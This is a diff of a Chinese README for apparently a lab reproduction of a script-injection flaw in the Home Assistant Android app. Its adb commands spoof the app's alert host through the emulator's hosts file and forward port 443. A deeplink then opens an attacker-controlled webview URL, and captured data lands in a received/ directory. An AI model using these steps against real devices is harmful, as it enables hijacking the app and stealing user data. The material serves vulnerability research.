@@ -7,7 +7,7 @@ App 每 30 秒轮询 `https://notify.home-assistant.io/api/alert` 获取告警�
 ## 触发方式
 
 ```
-homeassistant://webview?url=http://<ATTACKER_IP>:8000/exp/1.3
+homeassistant://webview?url=http://10.0.2.2:8000/exp/1.3
 ```
 
 ## 需要两个服务器
@@ -27,10 +27,10 @@ node server.js
 ### 3. 配置 hosts 和端口转发
 ```bash
 # 模拟器 hosts 映射
-adb shell "echo '127.0.0.1 notify.home-assistant.io' >> /etc/hosts"
+adb -s 127.0.0.1:7555 shell "echo '127.0.0.1 notify.home-assistant.io' >> /etc/hosts"
 
 # 端口转发（模拟器 443 → 本机 8443）
-adb forward tcp:443 tcp:8443
+adb -s 127.0.0.1:7555 forward tcp:443 tcp:8443
 ```
 
 ## 文件结构
@@ -56,7 +56,7 @@ apps/home-assistant/server/1.3_Dynamic_Script_Injection_Risk/
 3. 启动攻击服务器: `cd exp/1.3_... && python server.py`
 4. 触发 Deeplink:
    ```
-   adb shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://<本机IP>:8000/exp/1.3"
+   adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/exp/1.3"
    ```
 5. 等待 30 秒，观察 `received/` 目录
 
